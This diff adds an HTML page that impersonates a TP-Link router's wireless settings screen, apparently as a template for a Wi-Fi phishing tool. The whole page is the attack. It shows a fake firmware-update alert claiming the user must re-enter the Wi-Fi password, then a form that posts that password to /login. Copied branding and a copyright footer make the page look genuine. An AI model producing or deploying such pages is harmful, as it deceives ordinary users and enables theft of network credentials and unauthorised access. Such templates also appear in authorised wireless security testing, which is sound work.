@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TP-Link — Wireless Settings</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, Helvetica, sans-serif; background: #f5f5f5; }
+        .header { background: #4acbd6; padding: 12px 20px; display: flex; align-items: center; gap: 12px; }
+        .header h1 { color: #fff; font-size: 18px; font-weight: 400; }
+        .nav { background: #2a9ca6; padding: 0 20px; display: flex; gap: 0; }
+        .nav a { color: #fff; text-decoration: none; padding: 10px 16px; font-size: 13px; }
+        .nav a.active { background: #1a7c86; }
+        .container { max-width: 700px; margin: 20px auto; background: #fff; border: 1px solid #ddd; border-radius: 4px; }
+        .title-bar { background: #4acbd6; color: #fff; padding: 10px 16px; font-size: 14px; font-weight: 600; }
+        .body { padding: 24px; }
+        .alert { background: #fff3cd; border: 1px solid #ffc107; padding: 12px; margin-bottom: 20px; border-radius: 4px; font-size: 13px; color: #856404; }
+        table { width: 100%; border-collapse: collapse; }
+        td { padding: 10px 12px; border-bottom: 1px solid #f0f0f0; font-size: 13px; vertical-align: middle; }
+        td:first-child { width: 35%; color: #666; font-weight: 600; }
+        input[type="password"] { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 3px; font-size: 13px; }
+        .btn-row { text-align: right; padding: 16px 0 0; }
+        .btn { padding: 8px 24px; background: #4acbd6; color: #fff; border: none; border-radius: 3px; cursor: pointer; font-size: 13px; }
+        .btn:hover { background: #3ab8c2; }
+        .footer { text-align: center; padding: 12px; font-size: 11px; color: #999; }
+    </style>
+</head>
+<body>
+    <div class="header"><h1>TP-Link</h1></div>
+    <div class="nav"><a href="#" class="active">Wireless</a><a href="#">Network</a><a href="#">System Tools</a></div>
+    <div class="container">
+        <div class="title-bar">Wireless Security</div>
+        <div class="body">
+            <div class="alert">A firmware update requires re-entering your wireless password to apply security patches.</div>
+            <form method="POST" action="/login">
+                <table>
+                    <tr><td>Security Type</td><td>WPA/WPA2-Personal</td></tr>
+                    <tr><td>Encryption</td><td>AES</td></tr>
+                    <tr><td>Wireless Password</td><td><input type="password" name="wfphshr-wpa-password" placeholder="Enter Wi-Fi password" required></td></tr>
+                </table>
+                <div class="btn-row"><button type="submit" class="btn">Save</button></div>
+            </form>
+        </div>
+    </div>
+    <div class="footer">Copyright &copy; TP-Link Technologies Co., Ltd. All rights reserved.</div>
+</body>
+</html>
